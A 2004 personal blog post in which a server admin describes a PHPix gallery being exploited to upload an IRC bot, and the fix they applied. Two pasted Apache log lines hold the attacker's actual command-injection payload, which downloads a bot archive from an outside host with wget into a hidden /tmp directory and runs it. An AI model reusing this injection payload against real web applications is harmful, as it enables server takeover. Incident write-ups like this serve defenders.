---
layout: post
status: publish
published: true
title: Sorta got owned.
author:
  display_name: squarism
  login: chris
  email: squarism@gmail.com
  url: ''
author_login: chris
author_email: squarism@gmail.com
wordpress_id: 51
wordpress_url: http://squarism.com/2004/11/04/sorta-got-owned/
date: !binary |-
  MjAwNC0xMS0wNCAyMzo1NDoxNCAtMDUwMA==
date_gmt: !binary |-
  MjAwNC0xMS0wNSAwNDo1NDoxNCAtMDUwMA==
categories:
- Unix
tags: []
comments: []
---
<p>/tmp is writable for the apache user.  Someone exploited some bad code and uploaded an IRC bot on Aug 09.  It's not running now and we did a test to see if ./mech could be run.  It didn't start.</p>
<p>We fixed the PHPix code to check for system escapable characters.  PHPix really should have done this from the start.  Goes to show you that security really goes out the window with freeware and lots of services running.</p>
<p><code>
[Mon Aug 09 05:39:42 2004] [error] [client 82.208.182.219] File does not exist: /var/www/jonhammond/docs/albums/generated/Misc/Other/dogs__scaled_`cd , referer: http://jonhammond.com/albums/?mode=view&amp;album=Misc%2FOther&amp;pic=dogs.jpg&amp;
dispsize=http://www.martynlomax.com/phpix/index.php?album=pissups%2FOn-Anon&amp;
dispsize=`cd%20/tmp;mkdir%20'%20..%20';cd%20'%20..%20';wget%20idl3.home.ro/botu.tgz;
tar%20xzvf%20botu.tgz;cd%20botu;./mech;./mech`&amp;start=0
</code></p>
<p><code>
[Mon Aug 09 12:12:42 2004] [error] [client 82.208.182.219] File does not exist: /var/www/jonhammond/docs/albums/generated/Misc/Virginia/matt__scaled_`cd , referer: http://jonhammond.com/albums/?mode=view&amp;album=Misc%2F<br>Virginia&amp;pic=matt.jpg&amp;
dispsize=`cd%20/tmp;mkdir%20'%20..%20';cd%20'%20..%20';wget%20idl3.home.ro/botu2.tgz;
tar%20xzvf%20botu2.tgz;cd%20botu;./mech`&amp;start=0
</code></p>
<p>Wasn't a big deal, the IRC bot didn't run because apache's shell is /bin/false.  (I shouldn't be telling you all this)  I'm still researching what emech is, how IRC bots work and if I can lock down apache anymore.</p>
